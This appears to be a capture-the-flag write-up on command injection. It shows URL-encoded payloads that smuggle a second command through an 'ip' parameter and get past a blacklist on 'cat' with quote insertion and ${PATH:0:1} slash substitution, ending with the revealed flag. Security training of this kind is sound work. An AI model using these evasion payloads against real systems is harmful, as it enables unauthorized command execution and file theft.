## Challenge

Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. 

## Solution

If we use the following command:

```sh
ip=127.0.0.1%0a%09cat%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

which decoded is:

```sh
ip=127.0.0.1\n cat /home/1nj3c70r/flag.txt
```

and it gives `Invalid input`, so this means the command `cat` is blacklisted.

In this case I will add characters that will be ignored, such as an even number of quotes.

```sh
ip=127.0.0.1%0a%09c'a't%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
and the answer is `HTB{b451c_f1l73r5_w0n7_570p_m3}`.
